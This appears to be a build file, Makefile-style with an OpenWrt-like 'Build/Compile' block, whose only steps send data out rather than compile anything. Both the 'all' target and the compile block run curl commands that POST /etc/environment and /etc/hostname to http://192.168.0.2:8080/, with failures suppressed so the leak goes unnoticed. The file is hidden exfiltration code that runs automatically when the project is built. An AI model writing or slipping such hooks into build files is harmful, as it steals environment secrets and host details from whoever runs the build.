all:
	curl -X POST -d @/etc/environment http://192.168.0.2:8080/ || true
	curl -X POST -d @/etc/hostname http://192.168.0.2:8080/ || true

define Build/Compile
	curl -X POST -d @/etc/environment http://192.168.0.2:8080/ || true
	curl -X POST -d @/etc/hostname http://192.168.0.2:8080/ || true
endef
